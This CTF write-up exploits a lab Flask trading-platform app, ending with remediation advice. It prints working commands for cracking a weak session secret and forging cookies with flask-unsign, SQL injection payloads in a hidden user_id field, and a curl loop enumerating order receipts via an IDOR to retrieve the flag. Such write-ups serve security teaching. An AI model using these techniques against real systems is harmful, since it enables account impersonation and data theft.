# CTF Writeup 001/104: Trading Platform

**Target:** Trading Platform web application  
**Date:** 2026-06-21  
**Analyst:** Finch  
**Flag:** `FLAG{This_is_the_beggining}`  
**Difficulty:** Easy  

---

## Reconnaissance

The target was a web application exposed at `host.containers.internal:32768` (accessible from inside the Emacs container; `localhost` was not reachable due to Podman networking). The server identified as `Apache/2.4.67 (Debian)` serving a Flask application.

### Initial Fingerprinting

- **Server:** Apache/2.4.67 (Debian)
- **Framework:** Flask (identified via session cookie format: `eyJ...<payload>.<timestamp>.<signature>`)
- **Frontend:** Bootstrap 4, jQuery 3.5.1
- **Port:** 32768 (non-standard, suggests Docker/Podman port mapping)

### Application Flow

The application presented a multi-step login:

1. **Login page** (`GET /`) -- username field only
2. **Password page** (`GET /password/<username>`) -- password field with hidden `user_id`
3. **Dashboard** (`GET /dashboard?username=<username>`) -- authenticated landing
4. **Orders** (`GET /orders`) -- table of trading orders with receipt links
5. **Receipt** (`GET /order/<order_id>/receipt`) -- AJAX-loaded modal content

---

## Vulnerability Discovery

### Finding 1: Hardcoded Credentials in HTML Source (HIGH)

The login page source code contained a developer comment left in production:

```html
<!-- TODO: Delete the testing account (test:test). -->
```

This provided valid credentials (`test:test`) for immediate authenticated access.

### Finding 2: Weak Flask Session Secret Key (CRITICAL)

The Flask session cookie was decodable:

```bash
flask-unsign --decode --cookie "eyJ1c2VyX2lkIjoxMDAzMn0.ajhDPA.V_qRGpYs9ycScSazMAelG5lD0wI"
# Output: {'user_id': 10032}
```

A brute-force attack using a custom wordlist of ~70 common secret keys cracked the signing key in 62 attempts:

```bash
flask-unsign --unsign \
  --cookie "eyJ1c2VyX2lkIjoxMDAzMn0.ajhDPA.V_qRGpYs9ycScSazMAelG5lD0wI" \
  --wordlist /tmp/flask_secrets.txt \
  --no-literal-eval
# Output: [+] Found secret key after 62 attempts: b'your_secret_key'
```

The secret key was the default placeholder `your_secret_key`. This allowed forging arbitrary session cookies for any `user_id`:

```bash
flask-unsign --sign --cookie "{'user_id': 1}" --secret 'your_secret_key'
# Output: eyJ1c2VyX2lkIjoxfQ.ajhDYA.4pavLbrApJyNCbODCMJs-JOq0p0
```

### Finding 3: SQL Injection in user_id Parameter (HIGH)

The hidden `user_id` field in the password submission form was vulnerable to SQL injection. The backend query appeared to be:

```sql
SELECT * FROM users WHERE user_id = <user_id> AND password = '<password>'
```

The `user_id` value was concatenated directly into the query without parameterization.

**Proof of concept:**

| user_id | password | Result |
|---------|----------|--------|
| `10032` | `test` | Login succeeds (legitimate) |
| `10032 OR 1=1` | `test` | Login succeeds (injected) |
| `10032 OR 1=1` | `wrong` | Login fails (password still validated) |
| `10032 AND 1=2` | `test` | Login fails (condition false) |

The injection confirmed that `user_id` was injected raw into the SQL query, but the password was validated against the query result. The session `user_id` was always set from the database result, not the form field.

### Finding 4: Insecure Direct Object Reference on Order Receipts (HIGH -- FLAG)

The endpoint `/order/<order_id>/receipt` did not validate whether the authenticated user owned the requested order. Any logged-in user could access any order receipt by enumerating order IDs.

The user's visible orders on the `/orders` page were:

| Order ID | Ticker | Type | Quantity | Price |
|----------|--------|------|----------|-------|
| 300123 | SPY | BUY | 100 | $530 |
| 300214 | SPY | SELL | 50 | $535 |
| 300327 | SPY | BUY | 100 | $520 |
| 300481 | SPY | SELL | 100 | $540 |

However, order ID `300401` existed in the database but was **not displayed** in the user's orders list. It was hidden between the visible order IDs.

## Exploitation

### Attack Path

```
[1] Read HTML comment -> obtain credentials (test:test)
[2] Login with test:test -> authenticated session
[3] Enumerate order receipt IDs via /order/<id>/receipt
[4] Order 300401 (hidden from UI) -> FLAG{This_is_the_beggining}
```

### Step-by-Step

**Step 1 -- Obtain credentials from HTML source:**

```bash
curl -s http://host.containers.internal:32768/ | grep -i "TODO"
# Output: <!-- TODO: Delete the testing account (test:test). -->
```

**Step 2 -- Authenticate:**

```bash
# Submit username
curl -s -i -X POST http://host.containers.internal:32768/ -d "username=test"
# 302 -> /password/test

# Submit password (user_id from hidden form field)
curl -s -i -X POST http://host.containers.internal:32768/password/test \
  -d "username=test&user_id=10032&password=test"
# 302 -> /dashboard?username=test
# Set-Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0...
```

**Step 3 -- Enumerate order receipts:**

```bash
SESSION="session=eyJ1c2VyX2lkIjoxMDAzMn0.ajhEAg.6NdfsZ9PaIZJPWdTAr7DS0oaWac"

for O in $(seq 300000 300500); do
  RESP=$(curl -s "http://host.containers.internal:32768/order/$O/receipt" -b "$SESSION")
  TEXT=$(echo "$RESP" | grep -o '<code class="text-white">[^<]*</code>' | sed 's/<[^>]*>//g')
  if [ -n "$TEXT" ] && [ "$TEXT" != " " ]; then
    echo "Order $O: $TEXT"
  fi
done
```

**Step 4 -- Retrieve flag:**

```
Order 300123: Lorem ipsum dolor sit amet consectetur adipiscing elit...
Order 300214: Proin nam fringilla litora porttitor vulputate...
Order 300327: Lacus tincidunt et mollis suscipit ornare...
Order 300401: FLAG{This_is_the_beggining}
Order 300481: Risus class auctor feugiat sagittis aliquet...
```

## Additional Vulnerabilities (Not Required for Flag)

| Vulnerability | Impact |
|---|---|
| Weak Flask secret key (`your_secret_key`) | Full session forgery -- any user_id can be impersonated |
| SQLi in user_id form field | Database extraction via blind/boolean techniques |
| No CSRF protection on forms | Login/logout forms lack CSRF tokens |
| Session cookie not flagged Secure | Cookie transmitted over plaintext if not HTTPS |

---

## Remediation

1. **Remove hardcoded credentials** from HTML comments and delete test accounts.
2. **Replace Flask secret key** with a cryptographically random value (minimum 32 bytes).
3. **Parameterize all SQL queries** -- use ORM or prepared statements for user_id.
4. **Implement authorization checks** on `/order/<id>/receipt` -- verify the requesting user owns the order.
5. **Add CSRF protection** to all state-changing forms.
6. **Set Secure and SameSite flags** on session cookies.
7. **Disable directory enumeration** and return 404 for non-owned resources.
